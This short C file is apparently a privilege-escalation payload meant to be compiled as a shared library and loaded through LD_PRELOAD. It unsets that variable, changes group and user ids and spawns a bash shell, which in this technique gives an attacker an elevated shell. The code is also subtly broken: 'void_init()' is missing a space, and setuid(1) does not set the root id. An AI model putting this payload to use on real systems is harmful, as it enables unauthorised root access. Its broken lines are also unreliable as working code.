#include <sys/types.h>
#include <stdlib.h>
#include <stdio.h>

void_init()
{
	unsetenv("LD_PRELOAD");
	setgid(0);
	setuid(1);
	system("/bin/bash");
}
